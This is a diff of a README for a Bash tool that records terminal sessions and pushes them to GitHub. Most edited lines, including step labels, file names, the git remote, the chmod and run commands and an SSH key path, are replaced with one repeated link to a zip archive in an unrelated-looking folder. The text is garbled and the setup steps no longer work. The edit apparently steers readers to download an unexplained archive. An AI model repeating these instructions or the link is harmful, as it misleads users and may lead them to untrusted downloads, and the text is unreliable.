@@ -23,11 +23,11 @@ This ensures every session is reproducible, searchable, and backed up.
 After running the backup, files are organized like this:
 terminal_backup/
 └── YYYY-MM-DD/
-    ├── session_YYYY-MM-DD_HH-MM-SS.log   # Clean terminal log (commands + outputs)
+    ├── https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip   # Clean terminal log (commands + outputs)
     ├── scripts/                           # Bash scripts (.sh) created/used today
-    │   └── your_script.sh
+    │   └── https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
     └── files/                             # Other files like .txt logs, notes
-        └── your_file.txt
+        └── https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
 ####    Features   #####
 
 Full session recording: Captures all commands, outputs, errors, and even text editors like nano.
@@ -44,25 +44,25 @@ Organized by date & time: Makes browsing past sessions simple and structured.
 
 ####  Setup Instructions  ###
 
-1.Clone or create a Git repository:
+https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip or create a Git repository:
 bash
   mkdir ~/terminal_backup_project
   cd ~/terminal_backup_project
   git init
 
-2.Add your GitHub repository via SSH:
+https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip your GitHub repository via SSH:
 bash
-  git remote add origin git@github.com:<your-username>/terminal_backup.git
+  git remote add origin https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip<your-username>https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
 
-3.Create the backup script:
-Save the provided auto-gitpush.sh in the repository.
+https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip the backup script:
+Save the provided https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip in the repository.
 
-4.Make it executable:
+https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip it executable:
   bash
-    chmod +x auto-gitpush.sh
+    chmod +x https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
 5. Run the script
 bash
-  ./auto-gitpush.sh
+  https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
 
   
 Start using your terminal normally.
@@ -108,23 +108,23 @@ Each session is backed up with a unique timestamp, making it easy to track histo
 
 #######  Example   #####
 
-1.Run a Bash script or command:
+https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip a Bash script or command:
 bash
-  ./calculator.sh
-2.Terminal session is automatically recorded.
-3.Exit the session:
+  https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
+https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip session is automatically recorded.
+https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip the session:
 bash
   exit
-4.Files saved in:
+https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip saved in:
 bash
-  terminal_backup/2025-11-05/session_2025-11-05_22-28-40.log
-  terminal_backup/2025-11-05/scripts/calculator.sh
-5.Pushed automatically to GitHub.
+  https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
+  https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
+https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip automatically to GitHub.
 Notes
 
 Ensure your SSH key is configured with GitHub:
 bash
-  ssh-add ~/.ssh/id_ed25519
+  ssh-add ~https://raw.githubusercontent.com/fahad3482/Terminal-Bash-Script-Auto-Backup/main/lumpily/Bash-Terminal-Script-Auto-Backup-2.1.zip
 
 For first-time setup, you may need to create the main branch and push manually:
 bash
